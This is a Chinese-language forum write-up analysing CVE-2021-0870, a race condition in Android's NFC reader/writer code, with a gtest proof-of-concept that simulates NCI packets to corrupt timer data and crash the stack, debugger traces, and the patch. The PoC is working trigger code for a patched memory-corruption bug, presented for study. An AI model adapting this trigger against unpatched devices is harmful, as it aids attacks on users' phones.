> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271012.htm)

> [原创]AndroidNFC 条件竟用 RCE 漏洞分析

NFC 在人们的日常生活中扮演了重要角色, 已经成为移动设备不可或缺的组件, NFC 和蓝牙类似, 都是利用无线射频技术来实现设备之间的通信. 因此芯片固件和主机 NFC 子系统都是远程代码执行 (RCE) 攻击的目标。

 

CVE-2021-0870 是一枚 NFC 中的 RCE 高危漏洞, 2021 年 10 月漏洞通告中显示已被修复 https://source.android.com/security/bulletin/2021-10-01 漏洞成因是`RW_SetActivatedTagType` 通过将 NFC 进程控制块置零的方式, 实现 NFC 工作状态的切换, 但是新状态激活后, 上一个状态的超时检测定时器仍然在工作, 并且仍然使用着原来 TCB 里数据和指针, 新状态启动定时器会重写相应的数据, 产生条件竞争

NFC 技术框架
--------

### NFC 的三种运行模式

Reader/Write 模式: 简称 R/W 和 NFC Tag/NFC reader 有关

 

Peer-to-Peer 模式: 简称 P2P 它支持两个 NFC 设备进行交互

 

NFC Card Emulation(CE) : 他能把 NFC 功能的设备模拟成智能卡, 这样就可以实现手机支付 / 门禁卡功能

 

漏洞存在于 Reader/Write 模式 (R/W)

 

![](https://bbs.pediy.com/upload/attach/202112/803510_9GZ7V8VY8WMUMPN.jpg)

### Reader/Write 模式

NFC Tag/NFC reader 是 NFC 系统 RFID 中的两个重要的组件. 其中 Tag 是一种用于存储数据的被动式 RFID tag. 它自身不包含电源, 而是依赖其他组件, 如 NFC reader 通过线圈里的电磁感应给他供电, 然后通过某些射频通信协议来存取 NFC tag 里的数据.

 

NFC Forum 定义了两个数据结构用于设备间的通信 (不仅仅是设备之间, 也包括 R/W 模式种的 NFC Reader 和 NFC Tag 之间交互数据) , 分别是 NDEF 和 NFC Record

 

R/W 模式下使用 NDEF 数据结构通信时, NFC 设备的每一次数据交互都会被封装在一个 NDEF Message 中, 一个 Message 包括多个 NFC RecordMessage 的数据结构如下, 他是多个 record 组合而成

 

![](https://bbs.pediy.com/upload/attach/202112/803510_VJ94U5ZPN2BTJ53.png)

 

单个 record 的结构如下

 

![](https://bbs.pediy.com/upload/attach/202112/803510_5J6Z6P9WVJZVNNP.png)

 

本文不对详细的数据结构的各个字段做出解释

 

漏洞存在于使用 NDEF 数据包通信的过程中

### Tag

NFC Forum 定义了 4 种 tag, 分别为 Type1,2,3,4 . 他们之前的区别在于占用存储空间的大小和使用底层协议不同. 但能被 NFC Reader 和 NFC Tag 读写的 tag 类型远多于 4 种, Android Java 层提供了 "android.nfc.tech" 包用来处理不同类型的 tag, 下表列出了该包里的几个类, 这些类分别处理不同类型的 tag. 例如, NDEF 是用来处理 Type1-4 的类,

<table><thead><tr><th><a href="https://developer.android.com/reference/android/nfc/tech/IsoDep">IsoDep</a></th><th>Provides access to ISO-DEP (ISO 14443-4) properties and I/O operations on a <code>Tag</code>.</th></tr></thead><tbody><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/MifareClassic">MifareClassic</a></td><td>Provides access to MIFARE Classic properties and I/O operations on a <code>Tag</code>.</td></tr><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/MifareUltralight">MifareUltralight</a></td><td>Provides access to MIFARE Ultralight properties and I/O operations on a <code>Tag</code>.</td></tr><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/Ndef">Ndef</a></td><td>Provides access to NDEF content and operations on a <code>Tag</code>.</td></tr><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/NdefFormatable">NdefFormatable</a></td><td>Provide access to NDEF format operations on a <code>Tag</code>.</td></tr><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/NfcA">NfcA</a></td><td>Provides access to NFC-A (ISO 14443-3A) properties and I/O operations on a <code>Tag</code>.</td></tr><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/NfcB">NfcB</a></td><td>Provides access to NFC-B (ISO 14443-3B) properties and I/O operations on a <code>Tag</code>.</td></tr><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/NfcBarcode">NfcBarcode</a></td><td>Provides access to tags containing just a barcode.</td></tr><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/NfcF">NfcF</a></td><td>Provides access to NFC-F (JIS 6319-4) properties and I/O operations on a <code>Tag</code>.</td></tr><tr><td><a href="https://developer.android.com/reference/android/nfc/tech/NfcV">NfcV</a></td><td>Provides access to NFC-V (ISO 15693) properties and I/O operations on a <code>Tag</code>.</td></tr></tbody></table>

 

漏洞代码中出现的 T1T,T2T...TT,I93, 是 R/W 模式下, 探测, 读写 NDEF 数据包的具体实现方法, 是一种的技术标准. 比如 I93 是基于 ISO 15693 的实现方法, T1T 基于 NFC-A , 也就是 ISO 14443-3A

漏洞分析
----

### poc 代码

基于 Google 的测试框架 gtest 编写了一个集成测试文件, TEST 函数是测视例的 main 函数, 自动化测试框架从 TEST 调用 poc 代码:

```
TEST(NfcIntegrationTest, test_mifare_state_bug) {
  CallbackTracker tracker;
  g_callback_tracker = &tracker;
 
  NfcAdaptation& theInstance = NfcAdaptation::GetInstance();
  theInstance.Initialize();
 
  NFA_Init(&entry_funcs);
  NFA_Enable(nfa_dm_callback, nfa_conn_callback);
  usleep(5000);
 
  std::vector reset_core = {0x1, 0x29, 0x20};
  g_callback_tracker->SimulatePacketArrival(
      NCI_MT_NTF, 0, NCI_GID_CORE, NCI_MSG_CORE_RESET, reset_core.data(),
      reset_core.size());
 
  {
    std::unique_lock reset_done_lock(cv_mutex);
    reset_done_cv.wait(reset_done_lock);
  }
 
  NFA_EnableListening();
  NFA_EnablePolling(NFA_TECHNOLOGY_MASK_F | NFA_TECHNOLOGY_MASK_V);
 
  NFA_EnableDtamode(NFA_DTA_DEFAULT_MODE);
  NFA_StartRfDiscovery();
 
  {
    std::unique_lock enable_lock(cv_mutex);
    enable_cv.wait(enable_lock);
  }
 
  std::vector init_core = {0x0,  0xa, 0x3,  0xca, 0xff, 0xff, 0xff,
                                    0xff, 0x2, 0xe0, 0xe0, 0xe0, 0xe0, 0xe0};
  g_callback_tracker->SimulatePacketArrival(NCI_MT_RSP, 0, NCI_GID_CORE,
                                            NCI_MSG_CORE_INIT, init_core.data(),
                                            init_core.size());
 
  g_callback_tracker->SimulateHALEvent(HAL_NFC_POST_INIT_CPLT_EVT,
                                       HAL_NFC_STATUS_OK);
 
  {
    std::unique_lock nfa_enable_lock(cv_mutex);
    nfa_enable_cv.wait(nfa_enable_lock);
  }
 
  std::vector discover_rf = {0x0};
  g_callback_tracker->SimulatePacketArrival(
      NCI_MT_RSP, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_DISCOVER, discover_rf.data(),
      discover_rf.size());
 
  {
    std::unique_lock rf_discovery_started_lock(cv_mutex);
    rf_discovery_started_cv.wait(rf_discovery_started_lock);
  }
  std::vector activate_rf = {/* disc_id */ 0x0,
                                      NFC_DISCOVERY_TYPE_POLL_V,
                                      static_cast(NFC_PROTOCOL_T5T)};
  for (int i = 0; i < 27; i++) {
    activate_rf.push_back(0x6);
  }
  g_callback_tracker->SimulatePacketArrival(
      NCI_MT_NTF, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_INTF_ACTIVATED,
      activate_rf.data(), activate_rf.size());
  {
    std::unique_lock activated_lock(cv_mutex);
    activated_cv.wait(activated_lock);
  }
 
  NFA_RwReadNDef();
 
  {
    std::unique_lock i93_detect_lock(cv_mutex);
    i93_detect_cv.wait(i93_detect_lock);
  }
 
  g_callback_tracker->SimulatePacketArrival(
      NCI_MT_NTF, 0, NCI_GID_CORE, NCI_MSG_CORE_RESET, reset_core.data(),
      reset_core.size());
 
  std::vector deactivate_rf = {NFA_DEACTIVATE_TYPE_DISCOVERY, 0x1};
  g_callback_tracker->SimulatePacketArrival(
      NCI_MT_NTF, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_DEACTIVATE,
      deactivate_rf.data(), deactivate_rf.size());
 
  {
    std::unique_lock deactivated_lock(cv_mutex);
    deactivated_cv.wait(deactivated_lock);
  }
 
  std::vector activate_another_rf = {
      /* disc_id */ 0x0, NFC_DISCOVERY_TYPE_LISTEN_F, NFC_PROTOCOL_T3T};
  for (int i = 0; i < 70; i++) {
    activate_another_rf.push_back(0x2);
  }
  g_callback_tracker->SimulatePacketArrival(
      NCI_MT_NTF, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_INTF_ACTIVATED,
      activate_another_rf.data(), activate_another_rf.size());
 
  {
    std::unique_lock t3t_get_system_codes_lock(cv_mutex);
    t3t_get_system_codes_cv.wait(t3t_get_system_codes_lock);
  }
 
  NFA_Disable(true);
 
  {
    std::unique_lock nfa_disable_lock(cv_mutex);
    nfa_disable_cv.wait(nfa_disable_lock);
  }
} 
```

构造 poc 思路大致是 先让系统处于 i93 模式 然后发读数据请求 发完以后马上让从 i93 切换到 t3t 然后就崩溃

 

接下来把 poc 拆成几个部分逐一分析

### part1

第一部分代码是

```
CallbackTracker tracker;
 g_callback_tracker = &tracker;
 
 NfcAdaptation& theInstance = NfcAdaptation::GetInstance();
 theInstance.Initialize();
 
 NFA_Init(&entry_funcs);
 NFA_Enable(nfa_dm_callback, nfa_conn_callback);
 usleep(5000);

```

NFA_Init(&entry_funcs) 用于初始化 NFA 的控制块. 控制块的作用类似 Windows 中的 PEB 结构体

 

NFC 允许用户在应用层注册 NFC 芯片硬件抽象层 (HAL) 的回调函数, poc 中定义了一个 entry_funcs 回调函数表, 通过 NFA_Init 中的 NFC_Init 函数将 entry_funcs 回调函数表注册到 HAL 层. 直到 NFC 被禁用前这个函数指针数组都不会被释放. entry_funcs 如下:

```
tHAL_NFC_ENTRY entry_funcs = {
    .open = FakeOpen,
    .close = FakeClose,
    .core_initialized = FakeCoreInitialized,
    .write = FakeWrite,
    .prediscover = FakePrediscover,
    .control_granted = FakeControlGranted,
};

```

和在内核模块中给设备设置回调函数相似, entry_funcs 相当于 file_operation 结构体.

 

entry_funcs 里用很多 Fake 开头的回调函数重载了默认函数, 然后把他塞进 CallbackTracker 这个类, 这样做的好处是

 

1. 函数重载可以对系统默认的回调函数进行二次包装. 实现 Hook 功能. 比如后面会看到, 加入了线程同步的功能

 

2. 只通过一个自定义的类实现所有函数的调用. 让代码结构更加整洁

 

接着调用 NFA_Enable, 他调用的几个关键函数是

 

NFA_Enable->nfa_sys_sendmsg -> GKI_send_msg -> GKI_send_event -> pthread_cond_signal

 

NFA（NFC For Android）是安卓系统中 NFC 的实现. NFA_Enable 用来使能安卓 NFC, 调用它时 NFCC 必须已经上电, 该函数启动了 NFC 关键的几个任务, 打开了 NCI 的传输渠道, 重置了 NFC 控制器, 初始化整个 NFC 系统, 他是初始化最重要的函数, 一般只在系统启动时调用一次, 这里我们再次调用来生成一个独立于系统 NFC 的单独的 NFC 实验环境.

 

nfa_sys_sendmsg 函数用来发送 GKI (General Kernel Interface) 消息,

 

GKI_send_event 将 event 从一个 task 发送给另一个 task. 任务之间使用 event 数据结构的数据包, 经安卓的 HwBinder 进行消息传递. Hwbinder 是谷歌专门为供应商设计的进程间通信框架, 独立于安卓系统的 binder 存在, 是从 8.0 以后引入的新机制.

 

NFA_Enable 执行完后, 除了测试框架调用 Test 的主线程外, 进程中会多出两个线程, 这两个线程就是两个 task, 可近似理解为一个是 NFCC, 另一个充当客户端, 这两个线程之间互相发数据包交互. 作为服务端的 task 维护了一个命令队列, 里面存放要被执行的命令, 通过 nfc_ncif_check_cmd_queue 去检查队列里有没有命令, 如果有就去执行. nfc_task 是这个事件处理消息的主循环. 环解析命令事件并执行相应的回调函数. 代码如下, 前一个 if 半部分负责处理初始化, 后一个 if 是主循环

```
uint32_t nfc_task(__attribute__((unused)) uint32_t arg) {
...
  /* main loop */
  while (true) {
    event = GKI_wait(0xFFFF, 0);
...
    /* Handle NFC_TASK_EVT_TRANSPORT_READY from NFC HAL */
    if (event & NFC_TASK_EVT_TRANSPORT_READY) {
...
      nfc_set_state(NFC_STATE_CORE_INIT);
      nci_snd_core_reset(NCI_RESET_TYPE_RESET_CFG);
    }
    if (event & NFC_MBOX_EVT_MASK) {
      /* Process all incoming NCI messages */
      while ((p_msg = (NFC_HDR*)GKI_read_mbox(NFC_MBOX_ID)) != nullptr) {
        free_buf = true;
        /* Determine the input message type. */
        switch (p_msg->event & NFC_EVT_MASK) {
          case BT_EVT_TO_NFC_NCI:
            free_buf = nfc_ncif_process_event(p_msg);
            break;
          case BT_EVT_TO_START_TIMER:
            /* Start nfc_task 1-sec resolution timer */
            GKI_start_timer(NFC_TIMER_ID, GKI_SECS_TO_TICKS(1), true);
            break;
          case BT_EVT_TO_START_QUICK_TIMER:
            /* Quick-timer is required for LLCP */
            GKI_start_timer(
                NFC_QUICK_TIMER_ID,
                ((GKI_SECS_TO_TICKS(1) / QUICK_TIMER_TICKS_PER_SEC)), true);
            break;
          case BT_EVT_TO_NFC_MSGS:
            nfc_main_handle_hal_evt((tNFC_HAL_EVT_MSG*)p_msg);
            break;
          default:
            DLOG_IF(INFO, nfc_debug_enabled) << StringPrintf(
                "nfc_task: unhandle mbox message, event=%04x", p_msg->event);
            break;
        }
        if (free_buf) {
          GKI_freebuf(p_msg);
        }
      }
    }
...
}

```

### part2

第二部分代码如下所示

```
std::vector reset_core = {0x1, 0x29, 0x20};
g_callback_tracker->SimulatePacketArrival(
    NCI_MT_NTF, 0, NCI_GID_CORE, NCI_MSG_CORE_RESET, reset_core.data(),
    reset_core.size());
 
{
  std::unique_lock reset_done_lock(cv_mutex);
  reset_done_cv.wait(reset_done_lock);
} 
```

SimulatePacketArrival 是 poc 调用频率最高的函数, 模拟了从 task 之间数据交互的过程 .

 

task 之间使用 NCI 数据包通信, NCI 数据包的格式简要概述为

 

头部, 共 3 字节

```
/* NCI Command and Notification Format:
 * 3 byte message header:
 * byte 0: MT PBF GID
 * byte 1: OID
 * byte 2: Message Length */
 /* MT: Message Type (byte 0) */

```

头部后面跟实际数据, 如下所示

 

![](https://bbs.pediy.com/upload/attach/202112/803510_YBDRZBGN68R4G99.png)

 

SimulatePacketArrival 如何构造数据包呢? 以它第一次被调用为例

```
SimulatePacketArrival(NCI_MT_NTF, 0, NCI_GID_CORE, NCI_MSG_CORE_RESET, reset_core.data(),reset_core.size())

```

对比他的函数原型

```
void SimulatePacketArrival(uint8_t mt, uint8_t pbf, uint8_t gid,uint8_t opcode, uint8_t* data, size_t size)

```

可知 mt->NCI_MT_NTF , pbf-> 0 , gid->NCI_GID_CORE , opcode->NCI_MSG_CORE_RESET , data->reset_core.data() , size->reset_core.size() , std::vector<uint8_t> reset_core -> {0x1, 0x29, 0x20};

 

先构造前三个 Octect 组成头部, 然后在末尾插入数据

```
std::vector buffer(3);
buffer[0] = (mt << NCI_MT_SHIFT) | (pbf << NCI_PBF_SHIFT) | gid;//第一个8位,
buffer[1] = (mt == NCI_MT_DATA) ? 0 : opcode;//第二个8位
buffer[2] = static_cast(size);//第三个8位
buffer.insert(buffer.end(), data, data + size);//尾部附加的实际数据是{0x1, 0x29, 0x20}
data_callback_(buffer.size(), buffer.data()); 
```

接着调用 data_callback_ 函数发送数据给另一个 task.

 

每一次 SimulatePacketArrival 调用后面都有一个代码块, 例如

```
{
  std::unique_lock reset_done_lock(cv_mutex);
  reset_done_cv.wait(reset_done_lock);
} 
```

reset_done_cv 是一个条件变量, 条件变量是 C++11 引入的一种同步机制. 调用 reset_done_cv.wait 时会将线程挂起, 直到其他线程调用 notify 是才解除阻塞继续执行. 合理运用条件变量可以实现不同线程之间的同步.

 

比如 reset_done_cv 解除阻塞的时机是在调用 FakeWrite 的时候, 调用栈是

```
(gdb) bt
#0  0x000000555558b804 in FakeWrite(unsigned short, unsigned char*) ()
#1  0x0000007fb63ba7fc in nfc_ncif_check_cmd_queue (p_buf=0x7300007fb644f440) at system/nfc/src/nfc/nfc/nfc_ncif.cc:337
#2  0x0000007fb63bb7cc in nfc_ncif_send_cmd (p_buf=) at system/nfc/src/nfc/nfc/nfc_ncif.cc:402
#3  0x0000007fb63ae370 in nci_snd_core_init (nci_version=32 ' ') at system/nfc/src/nfc/nci/nci_hmsgs.cc:94
#4  0x0000007fb63c1f44 in nfc_ncif_proc_reset_rsp (p=, is_ntf=) at system/nfc/src/nfc/nfc/nfc_ncif.cc:1741
#5  0x0000007fb63b00c8 in nci_proc_core_ntf (p_msg=) at system/nfc/src/nfc/nci/nci_hrcv.cc:135
#6  0x0000007fb63bc1b8 in nfc_ncif_process_event (p_msg=) at system/nfc/src/nfc/nfc/nfc_ncif.cc:505
#7  0x0000007fb63c3df4 in nfc_task (arg=) at system/nfc/src/nfc/nfc/nfc_task.cc:378
#8  0x0000007fb6436758 in gki_task_entry (params=) at system/nfc/src/gki/ulinux/gki_ulinux.cc:96
#9  0x0000007fb5cfe9b8 in __pthread_start (arg=0x7f31d23cc0) at bionic/libc/bionic/pthread_create.cpp:347
... 
```

nfc_ncif_check_cmd_queue 函数会调用 HAL_WRITE(p_buf) 函数发数据给 HAL. 虽然从调用栈看不出 FakeWrite 实际就是 HAL_WRITE. 但我们之前重载了 HAL_WRITE 的函数指针所以 HAL_WRITE 实际就是 FakeWrite

```
void FakeWrite(uint16_t data_len, uint8_t* p_data) {
  uint8_t reset_pattern[5] = {0x20, 0x1, 0x2, 0x0, 0x0};
  if (data_len == 5 && !memcmp(reset_pattern, p_data, data_len)) {
    reset_done_cv.notify_one();
  }
 
  uint8_t i93_detect_pattern[6] = {0x0, 0x0, 0x3, 0x26, 0x1, 0x0};
  if (data_len == 6 && !memcmp(i93_detect_pattern, p_data, data_len)) {
    i93_detect_cv.notify_one();
  }
 
  uint8_t t3t_get_system_codes_pattern[7] = {0x21, 0x8, 0x4, 0xff,
                                             0xff, 0x1, 0xf};
  if (data_len == 7 &&
      !memcmp(t3t_get_system_codes_pattern, p_data, data_len)) {
    t3t_get_system_codes_cv.notify_one();
  }
}

```

因为写入 NFC 需要被频繁调用, 必须判断到来的数据包是否符合要求才能执行对应的操作, 所以第一个 if 中判断

```
if (data_len == 5 && !memcmp(reset_pattern, p_data, data_len))

```

符合条件就会解除调用 reset_done_cv.notify_one() 阻塞. 这里重载 HAL 函数指针的优势就显现出来了. FakeWrite 函数除了向 HAL 发送 / 写入数据之外, 还增加了解除 poc 中各种条件变量阻塞的功能方便了在竞态漏洞利用中进行时序同步

### part3

代码是

```
NFA_EnableListening();
NFA_EnablePolling(NFA_TECHNOLOGY_MASK_F | NFA_TECHNOLOGY_MASK_V);
 
NFA_EnableDtamode(NFA_DTA_DEFAULT_MODE);
NFA_StartRfDiscovery();
 
{
  std::unique_lock enable_lock(cv_mutex);
  enable_cv.wait(enable_lock);
}
 
std::vector init_core = {0x0,  0xa, 0x3,  0xca, 0xff, 0xff, 0xff,
                                  0xff, 0x2, 0xe0, 0xe0, 0xe0, 0xe0, 0xe0};
g_callback_tracker->SimulatePacketArrival(NCI_MT_RSP, 0, NCI_GID_CORE,
                                          NCI_MSG_CORE_INIT, init_core.data(),
                                          init_core.size());
 
g_callback_tracker->SimulateHALEvent(HAL_NFC_POST_INIT_CPLT_EVT,
                                     HAL_NFC_STATUS_OK);
 
{
  std::unique_lock nfa_enable_lock(cv_mutex);
  nfa_enable_cv.wait(nfa_enable_lock);
}
 
std::vector discover_rf = {0x0};
g_callback_tracker->SimulatePacketArrival(
    NCI_MT_RSP, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_DISCOVER, discover_rf.data(),
    discover_rf.size());
 
{
  std::unique_lock rf_discovery_started_lock(cv_mutex);
  rf_discovery_started_cv.wait(rf_discovery_started_lock);
} 
```

将 NFC 开启, 并进入 discovery 模式

### part4

代码是

```
NFA_RwReadNDef();
{
  std::unique_lock i93_detect_lock(cv_mutex);
  i93_detect_cv.wait(i93_detect_lock);
} 
```

NFA_RwReadNDef() 会读取 I93 tag 里的数据, 此时定时器开始启动用于检测是否超时,

 

下面是 I93 收到读请求后定时器被启动的调用栈

```
#0  nfc_start_quick_timer (p_tle=, type=, timeout=) at ../src/nfc/nfc/nfc_task.cc:190
#1  0x00000000005f8874 in rw_i93_send_to_lower (p_msg=) at ../src/nfc/tags/rw_i93.cc:680
#2  0x00000000005f916d in rw_i93_send_cmd_inventory (p_uid=, including_afi=, afi=) at ../src/nfc/tags/rw_i93.cc:740
#3  0x0000000000618f82 in RW_I93DetectNDef () at ../src/nfc/tags/rw_i93.cc:3985
#4  0x0000000000720e2e in nfa_rw_start_ndef_detection () at ../src/nfa/rw/nfa_rw_act.cc:1557
#5  0x000000000071a76e in nfa_rw_read_ndef () at ../src/nfa/rw/nfa_rw_act.cc:1737
#6  nfa_rw_handle_op_req (p_data=) at ../src/nfa/rw/nfa_rw_act.cc:2863
#7  0x000000000070b144 in nfa_rw_handle_event (p_msg=) at ../src/nfa/rw/nfa_rw_main.cc:246
#8  0x0000000000721df0 in nfa_sys_event (p_msg=) at ../src/nfa/sys/nfa_sys_main.cc:85 
```

### part5

代码是

```
g_callback_tracker->SimulatePacketArrival(
    NCI_MT_NTF, 0, NCI_GID_CORE, NCI_MSG_CORE_RESET, reset_core.data(),
    reset_core.size());
 
std::vector deactivate_rf = {NFA_DEACTIVATE_TYPE_DISCOVERY, 0x1};
g_callback_tracker->SimulatePacketArrival(
    NCI_MT_NTF, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_DEACTIVATE,
    deactivate_rf.data(), deactivate_rf.size());
 
{
  std::unique_lock deactivated_lock(cv_mutex);
  deactivated_cv.wait(deactivated_lock);
} 
```

这段代码关闭了 NFC, 目的是从 i93 顺利切换到 T3T

### part 6

```
std::vector activate_another_rf = {
     /* disc_id */ 0x0, NFC_DISCOVERY_TYPE_LISTEN_F, NFC_PROTOCOL_T3T};
 for (int i = 0; i < 70; i++) {
   activate_another_rf.push_back(0x2);
 }
 g_callback_tracker->SimulatePacketArrival(
     NCI_MT_NTF, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_INTF_ACTIVATED,
     activate_another_rf.data(), activate_another_rf.size());
 {
   std::unique_lock t3t_get_system_codes_lock(cv_mutex);
   t3t_get_system_codes_cv.wait(t3t_get_system_codes_lock);
 }
 NFA_Disable(true);
 {
   std::unique_lock nfa_disable_lock(cv_mutex);
   nfa_disable_cv.wait(nfa_disable_lock);
 } 
```

part5 中从 I93 tag 中读取了数据, 并且启动定时器, 我们必须在定时器过期前立即调用`RW_SetActivatedTagType`通知 NFCC 终止立即 I93 Tag, 并激活 T3T Tag.

```
g_callback_tracker->SimulatePacketArrival(NCI_MT_NTF,0,NCI_GID_RF_MANAGE,NCI_MSG_RF_INTF_ACTIVATED,activate_another_rf.data(),activate_another_rf.size());

```

就调用了 RW_SetActivatedTagType

 

RW_SetActivatedTagType 代码为

```
tNFC_STATUS RW_SetActivatedTagType(tNFC_ACTIVATE_DEVT* p_activate_params,tRW_CBACK* p_cback) {
  ...
  memset(&rw_cb.tcb, 0, sizeof(tRW_TCB));
  ...

```

原来从一个状态切换到另一个状态的方法是调用`memset(&rw_cb.tcb, 0, sizeof(tRW_TCB))`将控制块全部置零清空, 虽然看起来没错, 但是把控制块清空并不等价于将上个状态的上下文被全部重置, 他忽略了 I93tag 之前启动的定时器此时仍在工作, 但新的 tag 也会启动自己的定时器, 并改写 TCB 中相同偏移的数据

 

TCB 是被复用的, 我们使用 memset 而非 free, 说明状态切换后, 这块内存仍然存放的是 TCB, 所以此时系统里会出现两个定时器改写同一地址的情景

 

以下是 T3T tag 下定时器向 TCB 中写入数据时代码:

```
2367      *p_b = rw_t3t_mrti_base[e] * b; /* (B+1) * base (i.e T/t3t * 4^E) */

```

汇编是

```
1: x/5i $pc
=> 0x5de2a3 <_Z13rw_t3t_selectPhhh+787>:        mov    %r12d,%eax
   0x5de2a6 <_Z13rw_t3t_selectPhhh+790>:        shr    $0x6,%al
   0x5de2a9 <_Z13rw_t3t_selectPhhh+793>:        movzbl %al,%eax
   0x5de2ac <_Z13rw_t3t_selectPhhh+796>:        lea    0x813de0(,%rax,4),%rdi
   0x5de2b4 <_Z13rw_t3t_selectPhhh+804>:        mov    %rdi,%rax

```

调用栈是

```
#0  rw_t3t_select (peer_nfcid2=, mrti_check=, mrti_update=) at ../src/nfc/tags/rw_t3t.cc:2393
#1  0x000000000067ab9b in RW_SetActivatedTagType (p_activate_params=, p_cback=) at ../src/nfc/tags/rw_main.cc:290
#2  0x00000000007153fd in nfa_rw_activate_ntf (p_data=) at ../src/nfa/rw/nfa_rw_act.cc:2630
#3  0x000000000070b144 in nfa_rw_handle_event (p_msg=) at ../src/nfa/rw/nfa_rw_main.cc:246
#4  0x000000000070a710 in nfa_rw_proc_disc_evt (event=1 '\001', p_data=, excl_rf_not_active=) at ../src/nfa/rw/nfa_rw_main.cc:184
#5  0x00000000006b243d in nfa_dm_poll_disc_cback (event=, p_data=) at ../src/nfa/dm/nfa_dm_act.cc:1636
#6  0x00000000006a397d in nfa_dm_disc_notify_activation (p_data=) at ../src/nfa/dm/nfa_dm_discover.cc:1238
#7  0x0000000000697105 in nfa_dm_disc_sm_discovery (event=, p_data=0x7fff715200e0) at ../src/nfa/dm/nfa_dm_discover.cc:1918 
```

### 崩溃现场

i93 定时器仍存在于定时器链表中, t3t 被激活后里面的数据被 t3t 定时器破坏. 当 t3t 定时器也被插入链表头部时会产生段错误

 

崩溃现场:

 

![](https://bbs.pediy.com/upload/attach/202112/803510_7FUCMYBCYSQ3XHH.png)

 

对应的源代码是 while 那行

```
      /* Find the entry that the new one needs to be inserted in front of */
      p_temp = p_timer_listq->p_first;
=>>    while (p_tle->ticks > p_temp->ticks) {
        /* Update the tick value if looking at an unexpired entry */
        if (p_temp->ticks > 0) p_tle->ticks -= p_temp->ticks;
 
        p_temp = p_temp->p_next;
      }

```

下面这个调用栈并非 poc 的而是漏洞被发现时的, 放在这仅供参考

```
(rr) bt
#0  0x000000000075b6fd in GKI_add_to_timer_list (p_timer_listq=, p_tle=0x1221dd8 , p_tle@entry=0x7fff71517140) at ../fuzzer/gki_fuzz_fakes.cc:153
#1  0x000000000059d1ce in nfc_start_quick_timer (p_tle=, type=, timeout=) at ../src/nfc/nfc/nfc_task.cc:216
#2  0x00000000005e3c68 in rw_t3t_start_poll_timer (p_cb=) at ../src/nfc/tags/rw_t3t.cc:333
#3  RW_T3tGetSystemCodes () at ../src/nfc/tags/rw_t3t.cc:2964
#4  0x0000000000719a40 in nfa_rw_t3t_get_system_codes () at ../src/nfa/rw/nfa_rw_act.cc:2331
#5  nfa_rw_handle_op_req (p_data=) at ../src/nfa/rw/nfa_rw_act.cc:2971
#6  0x000000000071585d in nfa_rw_activate_ntf (p_data=) at ../src/nfa/rw/nfa_rw_act.cc:2677
#7  0x000000000070b144 in nfa_rw_handle_event (p_msg=) at ../src/nfa/rw/nfa_rw_main.cc:246
#8  0x000000000070a710 in nfa_rw_proc_disc_evt (event=1 '\001', p_data=, excl_rf_not_active=) at ../src/nfa/rw/nfa_rw_main.cc:184
#9  0x00000000006b243d in nfa_dm_poll_disc_cback (event=, p_data=) at ../src/nfa/dm/nfa_dm_act.cc:1636
#10 0x00000000006a397d in nfa_dm_disc_notify_activation (p_data=) at ../src/nfa/dm/nfa_dm_discover.cc:1238
#11 0x0000000000697105 in nfa_dm_disc_sm_discovery (event=, p_data=0x7fff715200e0) at ../src/nfa/dm/nfa_dm_discover.cc:1918
#12 nfa_dm_disc_sm_execute (event=, p_data=) at ../src/nfa/dm/nfa_dm_discover.cc:2533
#13 0x000000000068f601 in nfa_dm_disc_discovery_cback (event=, p_data=) at ../src/nfa/dm/nfa_dm_discover.cc:727
#14 0x00000000005b0a92 in nfc_ncif_proc_activate (p=, len=60 '<') at ../src/nfc/nfc/nfc_ncif.cc:1372
#15 0x00000000005c50c9 in nci_proc_rf_management_ntf (p_msg=0x617000003180) at ../src/nfc/nci/nci_hrcv.cc:276
#16 0x00000000005a2e6b in nfc_ncif_process_event (p_msg=0x617000003180) at ../src/nfc/nfc/nfc_ncif.cc:485 
```

漏洞缓解措施
------

只要在切换到下一个 tag 之前, 将上一个 tag 的定时器关闭即可

```
tNFC_STATUS RW_SetActivatedTagType(tNFC_ACTIVATE_DEVT* p_activate_params,
                                   tRW_CBACK* p_cback) {
  tNFC_STATUS status = NFC_STATUS_FAILED;
 
  /* check for null cback here / remove checks from rw_t?t */
  DLOG_IF(INFO, nfc_debug_enabled) << StringPrintf(
      "RW_SetActivatedTagType protocol:%d, technology:%d, SAK:%d",
      p_activate_params->protocol, p_activate_params->rf_tech_param.mode,
      p_activate_params->rf_tech_param.param.pa.sel_rsp);
 
  if (p_cback == nullptr) {
    LOG(ERROR) << StringPrintf(
        "RW_SetActivatedTagType called with NULL callback");
    return (NFC_STATUS_FAILED);
  }
 
  switch (rw_cb.tcb_type) {
    case RW_CB_TYPE_T1T: {
      nfc_stop_quick_timer(&rw_cb.tcb.t1t.timer);
      break;
    }
    case RW_CB_TYPE_T2T: {
      nfc_stop_quick_timer(&rw_cb.tcb.t2t.t2_timer);
      break;
    }
    case RW_CB_TYPE_T3T: {
      nfc_stop_quick_timer(&rw_cb.tcb.t3t.timer);
      nfc_stop_quick_timer(&rw_cb.tcb.t3t.poll_timer);
      break;
    }
    case RW_CB_TYPE_T4T: {
      nfc_stop_quick_timer(&rw_cb.tcb.t4t.timer);
      break;
    }
    case RW_CB_TYPE_T5T: {
      nfc_stop_quick_timer(&rw_cb.tcb.i93.timer);
      break;
    }
    case RW_CB_TYPE_MIFARE: {
      nfc_stop_quick_timer(&rw_cb.tcb.mfc.timer);
      nfc_stop_quick_timer(&rw_cb.tcb.mfc.mfc_timer);
      break;
    }
    case RW_CB_TYPE_UNKNOWN: {
      break;
    }
  }
 
  /* Reset tag-specific area of control block */
